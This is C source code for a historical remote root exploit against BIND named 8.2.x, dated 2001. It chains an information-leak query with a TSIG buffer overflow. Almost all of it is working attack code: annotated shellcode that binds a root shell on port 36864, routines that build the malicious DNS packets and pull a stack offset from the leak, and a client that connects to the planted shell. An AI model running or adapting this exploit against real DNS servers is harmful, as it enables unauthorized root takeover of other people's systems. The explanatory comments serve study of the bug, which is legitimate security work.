/*
 * This exploit has been fixed and extensive explanation and clarification
 * added.
 * Cleanup done by:
 *     Ian Goldberg     <ian@cypherpunks.ca>
 *     Jonathan Wilkins <jwilkins@bitland.net>
 * NOTE: the default installation of RedHat 6.2 seems to not be affected
 * due to the compiler options.  If BIND is built from source then the
 * bug is able to manifest itself.
 */
/*
 * Original Comment:
 * lame named 8.2.x remote exploit by
 *
 *   Ix		[adresadeforward@yahoo.com] (the master of jmpz),
 *   lucysoft	[lucysoft@hotmail.com] (the master of queries)
 *
 * this exploits the named INFOLEAK and TSIG bug (see http://www.isc.org/products/BIND/bind-security.html)
 * linux only shellcode
 * this is only for demo purposes, we are not responsable in any way for what you do with this code.
 *
 * flamez 	- canaris
 * greetz	- blizzard, netman.
 * creditz	- anathema <anathema@hack.co.za> for the original shellcode
 *  		- additional code ripped from statdx exploit by ron1n
 *
 * woo, almost forgot... this exploit is pretty much broken (+4 errors), but we hope you got the idea.
 * if you understand how it works, it won't be too hard to un-broke it
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>

#define max(a,b) ((a)>(b)?(a):(b))

#define BUFFSIZE 4096

int argevdisp1, argevdisp2;

char shellcode[] =
/* The numbers at the right indicate the number of bytes the call takes
 * and the number of bytes used so far.  This needs to be lower than
 * 62 in order to fit in a single Query Record.  2 are used in total to
 * send the shell code
 */
/* main: */
/* "callz" is more than 127 bytes away, so we jump to an intermediate
   spot first */
"\xeb\x44"                           /* jmp intr                */ // 2 - 2
/* start: */
"\x5e"                               /* popl %esi               */ // 1 - 3

  /* socket() */
"\x29\xc0"                           /* subl %eax, %eax         */ // 2 - 5
"\x89\x46\x10"                       /* movl %eax, 0x10(%esi)   */ // 3 - 8
"\x40"                               /* incl %eax               */ // 1 - 9
"\x89\xc3"                           /* movl %eax, %ebx         */ // 2 - 11
"\x89\x46\x0c"                       /* movl %eax, 0x0c(%esi)   */ // 3 - 14
"\x40"                               /* incl %eax               */ // 1 - 15
"\x89\x46\x08"                       /* movl %eax, 0x08(%esi)   */ // 3 - 18
"\x8d\x4e\x08"                       /* leal 0x08(%esi), %ecx   */ // 3 - 21
"\xb0\x66"                           /* movb $0x66, %al         */ // 2 - 23
"\xcd\x80"                           /* int $0x80               */ // 2 - 25

  /* bind() */
"\x43"                               /* incl %ebx               */ // 1 - 26
"\xc6\x46\x10\x10"                   /* movb $0x10, 0x10(%esi)  */ // 4 - 30
"\x66\x89\x5e\x14"                   /* movw %bx, 0x14(%esi)    */ // 4 - 34
"\x88\x46\x08"                       /* movb %al, 0x08(%esi)    */ // 3 - 37
"\x29\xc0"                           /* subl %eax, %eax         */ // 2 - 39
"\x89\xc2"                           /* movl %eax, %edx         */ // 2 - 41
"\x89\x46\x18"                       /* movl %eax, 0x18(%esi)   */ // 3 - 44
/*
 * the port address in hex (0x9000 = 36864), if this is changed, then a similar
 * change must be made in the connection() call
 * NOTE: you only get to set the high byte
 */
"\xb0\x90"                           /* movb $0x90, %al         */ // 2 - 46
"\x66\x89\x46\x16"                   /* movw %ax, 0x16(%esi)    */ // 4 - 50
"\x8d\x4e\x14"                       /* leal 0x14(%esi), %ecx   */ // 3 - 53
"\x89\x4e\x0c"                       /* movl %ecx, 0x0c(%esi)   */ // 3 - 56
"\x8d\x4e\x08"                       /* leal 0x08(%esi), %ecx   */ // 3 - 59

"\xeb\x02"                           /* jmp cont                */ // 2 - 2
/* intr: */
"\xeb\x43"                           /* jmp callz               */ // 2 - 4

/* cont: */
"\xb0\x66"                           /* movb $0x66, %al         */ // 2 - 6
"\xcd\x80"                           /* int $0x80               */ // 2 - 10

  /* listen() */
"\x89\x5e\x0c"                       /* movl %ebx, 0x0c(%esi)   */ // 3 - 11
"\x43"                               /* incl %ebx               */ // 1 - 12
"\x43"                               /* incl %ebx               */ // 1 - 13
"\xb0\x66"                           /* movb $0x66, %al         */ // 2 - 15
"\xcd\x80"                           /* int $0x80               */ // 2 - 17

  /* accept() */
"\x89\x56\x0c"                       /* movl %edx, 0x0c(%esi)   */ // 3 - 20
"\x89\x56\x10"                       /* movl %edx, 0x10(%esi)   */ // 3 - 23
"\xb0\x66"                           /* movb $0x66, %al         */ // 2 - 25
"\x43"                               /* incl %ebx               */ // 1 - 26
"\xcd\x80"                           /* int $0x80               */ // 1 - 27

  /* dup2(s, 0); dup2(s, 1); dup2(s, 2); */
"\x86\xc3"                           /* xchgb %al, %bl          */ // 2 - 29
"\xb0\x3f"                           /* movb $0x3f, %al         */ // 2 - 31
"\x29\xc9"                           /* subl %ecx, %ecx         */ // 2 - 33
"\xcd\x80"                           /* int $0x80               */ // 2 - 35
"\xb0\x3f"                           /* movb $0x3f, %al         */ // 2 - 37
"\x41"                               /* incl %ecx               */ // 1 - 38
"\xcd\x80"                           /* int $0x80               */ // 2 - 40
"\xb0\x3f"                           /* movb $0x3f, %al         */ // 2 - 42
"\x41"                               /* incl %ecx               */ // 1 - 43
"\xcd\x80"                           /* int $0x80               */ // 2 - 45

  /* execve() */
"\x88\x56\x07"                       /* movb %dl, 0x07(%esi)    */ // 3 - 48
"\x89\x76\x0c"                       /* movl %esi, 0x0c(%esi)   */ // 3 - 51
"\x87\xf3"                           /* xchgl %esi, %ebx        */ // 2 - 53
"\x8d\x4b\x0c"                       /* leal 0x0c(%ebx), %ecx   */ // 3 - 56
"\xb0\x0b"                           /* movb $0x0b, %al         */ // 2 - 58
"\xcd\x80"                           /* int $0x80               */ // 2 - 60

"\x90"

/* callz: */
"\xe8\x72\xff\xff\xff"               /* call start              */ // 5 - 5
"/bin/sh"; /* There's a NUL at the end here */                     // 8 - 13

unsigned long resolve_host(char* host)
{
	long res;
	struct hostent* he;

	if (0 > (res = inet_addr(host)))
	{
		if (!(he = gethostbyname(host)))
			return(0);
		res = *(unsigned long*)he->h_addr;
	}
	return(res);
}

int dumpbuf(char *buff, int len)
{
	char line[17];
	int x;

	/* print out a pretty hex dump */
	for(x=0;x<len;x++){
		if(!(x%16) && x){
			line[16] = 0;
			printf("\t%s\n", line);
		}
		printf("%02X ", (unsigned char)buff[x]);
		if(isprint((unsigned char)buff[x]))
			line[x%16]=buff[x];
		else
			line[x%16]='.';
	}
	printf("\n");
}

void
runshell(int sockd)
{
    char buff[1024];
    int fmax, ret;
    fd_set fds;

    fmax = max(fileno(stdin), sockd) + 1;
    send(sockd, "uname -a; id;\n", 15, 0);

    for(;;)
    {

        FD_ZERO(&fds);
        FD_SET(fileno(stdin), &fds);
        FD_SET(sockd, &fds);

        if(select(fmax, &fds, NULL, NULL, NULL) < 0)
        {
            exit(EXIT_FAILURE);
        }

        if(FD_ISSET(sockd, &fds))
        {
            bzero(buff, sizeof buff);
            if((ret = recv(sockd, buff, sizeof buff, 0)) < 0)
            {
                exit(EXIT_FAILURE);
            }
            if(!ret)
            {
                fprintf(stderr, "Connection closed\n");
                exit(EXIT_FAILURE);
            }
            write(fileno(stdout), buff, ret);
        }

        if(FD_ISSET(fileno(stdin), &fds))
        {
            bzero(buff, sizeof buff);
            ret = read(fileno(stdin), buff, sizeof buff);
            if(send(sockd, buff, ret, 0) != ret)
            {
                fprintf(stderr, "Transmission loss\n");
                exit(EXIT_FAILURE);
            }
        }
    }
}


connection(struct sockaddr_in host)
{
	int sockd;

	host.sin_port = htons(36864);

	printf("[*] connecting..\n");
	usleep(2000);

	if((sockd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
	{
		exit(EXIT_FAILURE);
	}

	if(connect(sockd, (struct sockaddr *) &host, sizeof host) != -1)
	{
		printf("[*] wait for your shell..\n");
		usleep(500);
	        runshell(sockd);
	}
	else
	{
		printf("[x] error: named not vulnerable or wrong offsets used\n");
	}

	close(sockd);
}




int infoleak_qry(char* buff)
{
        HEADER* hdr;
        int n, k;
        char* ptr;
        int qry_space = 12;
        int dummy_names = 7;
        int evil_size = 0xff;

        memset(buff, 0, BUFFSIZE);
        hdr = (HEADER*)buff;

        hdr->id = htons(0xbeef);
        hdr->opcode  = IQUERY;
        hdr->rd      = 1;
        hdr->ra      = 1;
        hdr->qdcount = htons(0);
        hdr->nscount = htons(0);
        hdr->ancount = htons(1);
        hdr->arcount = htons(0);


	ptr = buff + sizeof(HEADER);
	printf("[d] HEADER is %d long\n", sizeof(HEADER));
	
	n = 62;

	for(k=0; k < dummy_names; k++)
	{
		*ptr++ = n;
		ptr += n;
	}
	ptr += 1;

        PUTSHORT(1/*ns_t_a*/, ptr);              /* type */
        PUTSHORT(T_A, ptr);                      /* class */
        PUTLONG(1, ptr);                		/* ttl */

	PUTSHORT(evil_size, ptr);			/* our *evil* size */
	
	return(ptr - buff + qry_space);
	
}



int evil_query(char* buff, int offset)
{
	int lameaddr, shelladdr, rroffsetidx, rrshellidx, deplshellcode, offset0;
	HEADER* hdr;
	char *ptr;
	int k, bufflen;
	u_int n, m;
	u_short s;
	int i;
	int shelloff, shellstarted, shelldone;
	int towrite, ourpack;
	int n_dummy_rrs = 7;

	printf("[d] evil_query(buff, %08x)\n", offset);
	printf("[d] shellcode is %d long\n", sizeof(shellcode));

	shelladdr = offset - 0x200;

        lameaddr  = shelladdr + 0x300;
	
	ourpack = offset - 0x250 + 2;
	towrite = (offset & ~0xff) - ourpack - 6;
	printf("[d] olb = %d\n", (unsigned char) (offset & 0xff));

	rroffsetidx = towrite / 70;
	offset0 = towrite - rroffsetidx * 70;

	if ((offset0 > 52) || (rroffsetidx > 6))
	{
		printf("[x] could not write our data in buffer (offset0=%d, rroffsetidx=%d)\n", offset0, rroffsetidx);
		return(-1);
	}
		
	rrshellidx = 1;
	deplshellcode = 2;
	
	hdr = (HEADER*)buff;
	
	memset(buff, 0, BUFFSIZE);
	
	/* complete the header */
	
	hdr->id = htons(0xdead);
	hdr->opcode  = QUERY;
	hdr->rd      = 1;
	hdr->ra      = 1;
	hdr->qdcount = htons(n_dummy_rrs);
	hdr->ancount = htons(0);
	hdr->arcount = htons(1);
	
	ptr = buff + sizeof(HEADER);
	
	shellstarted = 0;
	shelldone = 0;
	shelloff = 0;
	
	n = 63;
	for (k = 0; k < n_dummy_rrs; k++)
	{
		*ptr++ = (char)n;
		
		for(i = 0; i < n-2; i++)
		{
			if((k == rrshellidx) && (i == deplshellcode) && !shellstarted)
			{
				printf("[*] injecting shellcode at %d\n", k);
				shellstarted = 1;
			}
		
			if ((k == rroffsetidx) && (i == offset0))
			{
				*ptr++ = lameaddr & 0x000000ff;
				*ptr++ = (lameaddr & 0x0000ff00) >> 8;
				*ptr++ = (lameaddr & 0x00ff0000) >> 16;
				*ptr++ = (lameaddr & 0xff000000) >> 24;
				*ptr++ = shelladdr & 0x000000ff;
				*ptr++ = (shelladdr & 0x0000ff00) >> 8;
				*ptr++ = (shelladdr & 0x00ff0000) >> 16;
				*ptr++ = (shelladdr & 0xff000000) >> 24;
                                *ptr++ = argevdisp1 & 0x000000ff;
                                *ptr++ = (argevdisp1 & 0x0000ff00) >> 8;
                                *ptr++ = (argevdisp1 & 0x00ff0000) >> 16;
                                *ptr++ = (argevdisp1 & 0xff000000) >> 24;
                                *ptr++ = argevdisp2 & 0x000000ff;
                                *ptr++ = (argevdisp2 & 0x0000ff00) >> 8;
                                *ptr++ = (argevdisp2 & 0x00ff0000) >> 16;
                                *ptr++ = (argevdisp2 & 0xff000000) >> 24;
				i += 15;
			}
			else
			{
				if (shellstarted && !shelldone)
				{
					*ptr++ = shellcode[shelloff++];	
					if(shelloff == (sizeof(shellcode)))
						shelldone=1;
				}
				else
				{
					*ptr++ = i;
				}
			}
		}
		
		/* OK: this next set of bytes constitutes the end of the
                 *     NAME field, the QTYPE field, and the QCLASS field.
                 *     We have to have the shellcode skip over these bytes,
                 *     as well as the leading 0x3f (63) byte for the next
                 *     NAME field.  We do that by putting a jmp instruction
                 *     here.
                 */
		*ptr++ = 0xeb;
		
		if (k == 0)
		{
			*ptr++ = 10;
			
			/* For alignment reasons, we need to stick an extra
                         * NAME segment in here, of length 3 (2 + header).
                         */
			m = 2;
			*ptr++ = (char)m;        // header
			ptr += 2;
		}
		else
		{
			*ptr++ = 0x07;
		}
		
		/* End the NAME with a compressed pointer.  Note that it's
                 * not clear that the value used, C0 00, is legal (it
                 * points to the beginning of the packet), but BIND apparently
                 * treats such things as name terminators, anyway.
                 */
		*ptr++ = 0xc0; /*NS_CMPRSFLGS*/
		*ptr++ = 0x00; /*NS_CMPRSFLGS*/
		
		ptr += 4;      /* QTYPE, QCLASS */
	}
	
	/* Now we make the TSIG AR */
	*ptr++ = 0x00;       /* Empty name */

	PUTSHORT(0xfa, ptr); /* Type  TSIG */
	PUTSHORT(0xff, ptr); /* Class ANY  */

	bufflen = ptr - buff;
	
	// dumpbuf(buff, bufflen);

	return(bufflen);
}

long xtract_offset(char* buff, int len)
{
	long ret;
	
	/* Here be dragons. */
	/* (But seriously, the values here depend on compilation options
         *  used for BIND.
         */
	ret = *((long*)&buff[0x214]);
	argevdisp1 = 0x080d7cd0;
	argevdisp2 = *((long*)&buff[0x264]);
	printf("[d] argevdisp1 = %08x, argevdisp2 = %08x\n",
		argevdisp1, argevdisp2);
	
	// dumpbuf(buff, len);
	
	return(ret);
}




int main(int argc, char* argv[])
{
	struct sockaddr_in sa;
	int sock;
	long address;
	char buff[BUFFSIZE];
	int len, i;
	long offset;
	socklen_t reclen;
	unsigned char foo[4];

	printf("[*] named 8.2.x (< 8.2.3-REL) remote root exploit by lucysoft, Ix\n");
	printf("[*] fixed by ian@cypherpunks.ca and jwilkins@bitland.net\n\n");

	address = 0;
	if (argc < 2)
	{
		printf("[*] usage : %s host\n", argv[0]);

		return(-1);
	}

	if (!(address = resolve_host(argv[1])))
	{
		printf("[x] unable to resolve %s, try using an IP address\n", argv[1]);
		return(-1);
	} else {
		memcpy(foo, &address, 4);
		printf("[*] attacking %s (%d.%d.%d.%d)\n", argv[1], foo[0], foo[1], foo[2], foo[3]);
	}
	
	sa.sin_family = AF_INET;

	if (0 > (sock = socket(sa.sin_family, SOCK_DGRAM, 0)))
	{
		return(-1);
	}
	
	sa.sin_family = AF_INET;
	sa.sin_port = htons(53);
	sa.sin_addr.s_addr= address;
	
	
	len = infoleak_qry(buff);
	printf("[d] infoleak_qry was %d long\n", len);
	len = sendto(sock, buff, len, 0 , (struct sockaddr *)&sa, sizeof(sa));
	if (len < 0)
	{
		printf("[*] unable to send iquery\n");
		return(-1);
	}
	
	reclen = sizeof(sa);
	len = recvfrom(sock, buff, BUFFSIZE, 0, (struct sockaddr *)&sa, &reclen);
	if (len < 0)
	{
                printf("[x] unable to receive iquery answer\n");
                return(-1);	
	}
	printf("[*] iquery resp len = %d\n", len);
	
	offset = xtract_offset(buff, len);
	printf("[*] retrieved stack offset = %x\n", offset);
	
	
	len = evil_query(buff, offset);
	if(len < 0){
		printf("[x] error sending tsig packet\n");
		return(0);
	}
	
	sendto(sock, buff, len, 0 , (struct sockaddr *)&sa, sizeof(sa));
	
	if (0 > close(sock))
	{
		return(-1);
	}

	connection(sa);

	return(0);	
}
/*                   www.hack.co.za  [2 March 2001]*/